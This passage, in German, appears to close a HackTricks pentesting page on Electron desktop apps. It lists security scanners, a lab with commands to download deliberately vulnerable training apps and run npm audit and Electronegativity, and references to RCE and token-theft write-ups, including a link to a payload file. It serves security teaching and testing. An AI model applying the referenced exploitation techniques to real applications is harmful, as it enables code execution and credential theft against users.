Die kuratierte Sammlung **awesome-electronjs-hacking** bietet zusätzliche Recherche, Tools und Ressourcen zu verwundbaren Anwendungen.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) ist ein Tool zum Erkennen von Fehlkonfigurationen und Sicherheits-Anti-Patterns in Electron-basierten Anwendungen.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ist ein Open-Source-VS-Code-Plugin für Electron-Anwendungen, das Electronegativity verwendet.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) prüft auf verwundbare Drittanbieterbibliotheken.
- [**Electro.ng**](https://electro.ng/) ist ein kommerzielles Tool zur Sicherheitsanalyse von Electron.

## Labs

Unter [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) findest du ein Lab zum Ausnutzen verwundbarer Electron-Apps.<sup>[[4]](#references)</sup>

Diese Befehle helfen dir beim Durcharbeiten des Labs:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Frühere veröffentlichte Adresse für bestehende Lesezeichen: [Electron-Desktop-Apps](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Die Route der gesamten Seite leitet hierher weiter; der historische Fragmentanker wird nicht gepflegt.

## References

- [1] [Phishing und Credential Harvesting in Electron-Anwendungen](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop-App: Beliebiges Lesen von Dateien](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Missbrauch der fehlenden Context Isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Hacking moderner Desktop-Apps mit XSS und RCE: Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - eine kuratierte Liste von Ressourcen zur (Un-)Sicherheit von Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Missbrauch von Electron-APIs: Die erste Wahl eines Angreifers](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration-RCE-Payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE mit einem Klick in Electron-Anwendungen](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Die Gefahren von Electron's shell.openExternal() - viele Wege zu Remote Code Execution](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Beliebige URLs zulassen, beliebige Codeausführung erwarten](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [RCE in einem bekannten japanischen Chat-Tool mit einem veralteten Electron-Feature erzielen](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Remote Code Execution](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Remote Code Execution im Restricted Mode (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [GitHub-Token-Diebstahl mit einem Klick durch VS Code Webview Keyboard Event Injection](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593: Webviews können beliebige Tastenkombinationen in der Haupt-Workbench auslösen](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: Öffnen von Notebooks bestätigen und keinen vom Aufrufer bereitgestellten installExtension-Kontext mehr akzeptieren](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: Programmgesteuertes erneutes Auslösen von Tastendrücken und Klicks in Notebook-Webviews blockieren](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / lokale Workspace-Erweiterungen](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Wie ich jede große IDE in 2 Wochen gehackt habe](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Beliebte Desktop-Apps pwnen und neue Angriffsflächen in Electron aufdecken](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron-Sicherheit](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Reverse Engineer Anything](https://github.com/morluto/rea)
- [24] [Rekonstruktion von JavaScript-Artefakten mit REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Workflows für JavaScript-Anwendungen über mehrere Schichten mit REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
